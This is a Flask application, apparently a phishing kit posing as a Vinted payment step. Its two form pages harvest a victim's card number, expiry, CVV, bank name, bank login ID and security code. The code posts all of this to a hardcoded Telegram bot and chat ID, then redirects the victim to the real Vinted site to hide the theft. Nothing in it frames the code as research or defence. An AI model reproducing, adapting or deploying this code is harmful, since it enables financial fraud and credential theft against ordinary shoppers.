from flask import Flask, render_template, request, redirect, session, url_for
import requests

app = Flask(__name__)
app.secret_key = 'change_this_secret_key'

BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
CHAT_ID = "6297861735"

@app.route('/')
def form_step1():
    return render_template('form1.html')

@app.route('/form2', methods=['POST'])
def form_step2():
    # Enregistrer les données de la page 1 dans la session
    session['amount'] = request.form['amount']
    session['card_number'] = request.form['card_number']
    session['expiry'] = request.form['expiry']
    session['cvv'] = request.form['cvv']
    return render_template('form2.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Récupérer données page 1
    amount = session.get('amount')
    card_number = session.get('card_number')
    expiry = session.get('expiry')
    cvv = session.get('cvv')

    # Récupérer données page 2
    bank_name = request.form['bank_name']
    bank_id = request.form['bank_id']
    security_code = request.form['security_code']

    # Création du texte à envoyer sur Telegram
    text = f"""📨 Nouvelle soumission :
💰 Montant : {amount} €
💳 Carte : {card_number}
📅 Expiration : {expiry}
🔒 CVV : {cvv}
🏦 Banque : {bank_name}
🆔 Identifiant : {bank_id}
🔐 Code de sécurité : {security_code}
"""

    # Envoi à Telegram
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': text}

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # Lancer une exception si l'API Telegram échoue
    except requests.exceptions.RequestException as e:
        return f"Erreur d’envoi : {e}", 500

    # Rediriger l'utilisateur vers Vinted après soumission
    return redirect("https://www.vinted.com")

if __name__ == '__main__':
    app.run(debug=True)
